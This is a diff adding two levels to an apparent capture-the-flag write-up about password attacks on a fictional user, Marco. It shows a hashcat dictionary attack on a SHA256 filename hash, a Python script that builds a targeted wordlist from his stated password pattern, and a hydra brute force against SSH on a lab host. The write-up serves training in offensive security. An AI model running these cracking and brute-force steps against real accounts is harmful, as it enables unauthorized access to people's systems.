@@ -96,3 +96,71 @@ This then revealed the password to be `Bianchi2495`
 ### Level 4: Hash Image
 
 > On social.thm:5003, Marco recently uploaded a new profile picture. For privacy and storage consistency, the platform automatically renames uploaded files to the SHA256 hash of the original filename and saves them in the format (SHA256).png. Your task is to identify the original filename of Marco’s uploaded profile picture. Submit only the filename to proceed.
+
+To begin solving this level, Marco's social media page was accessed using the password learned in the previous task.
+
+![alt text](<Marco's Social Media Page.png>)
+
+His profile picture was downloaded onto the attacker machine. The file's name was `d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png`. From the task briefing, it was known that the SHA256 hash was used. To crack the hash via a basic dictionary attack using `rockyou.txt`, the following command was run.
+
+```bash
+hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+- -m 1400 specifies the SHA-256 hashing mode.
+- -a 0 specifies a basic dictionary attack.
+
+This revealed the hash to be `d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b:family`.
+
+![alt text](<hashcat result.png>)
+
+### Level 5: Custom Wordlist Building
+
+> Marco has revealed his password pattern on social.thm:5003, using predictable rules based on keywords and formatting. Use this information to generate a targeted wordlist and brute-force the SSH service with username marco.
+
+From visiting Marco's social media page, his password pattern was established.
+
+> My tip for strong passsord: I take a company keyword, capitalize it, then append the year like 2024 or any other number and an exclamation mark.
+
+These defined the rules required to generate a custom wordlist. The company keywords were obtained from the portal in level 2, which were the following:
+
+[innovation, excellence, security, digital, cloud, future, talent]
+
+The `phrasegenerator.py` script was generated to produce a list of potential passwords in `phrases.txt`.
+
+```python
+"""A script to generate potential passwords according to Marco's rules."""
+
+# The company keywords.
+KEYWORDS = ["innovation", "excellence", "security",
+            "digital", "cloud", "future", "talent"]
+YEARS = range(1990, 2030)
+OUTPUT_FILE = "phrases.txt"
+
+
+def generate_phrases():
+    """Return phrases in the form: CapitalizedKeyword + number + !"""
+    return [
+        f"{keyword.capitalize()}{number}!"
+        for keyword in KEYWORDS
+        for number in YEARS
+    ]
+
+
+if __name__ == "__main__":
+    with open(OUTPUT_FILE, "w", encoding="utf-8") as output:
+        output.write("\n".join(generate_phrases()))
+        if KEYWORDS:
+            output.write("\n")
+
+```
+
+Hydra then needed to be used to brute force the SSH service. This was done using the command:
+
+```bash
+hydra -l marco -P phrases.txt 10.129.165.186 ssh -t 32
+```
+
+![alt text](<Hydra Result.png>)
+
+This revealed Marco's ssh password to be `Security2024!`.
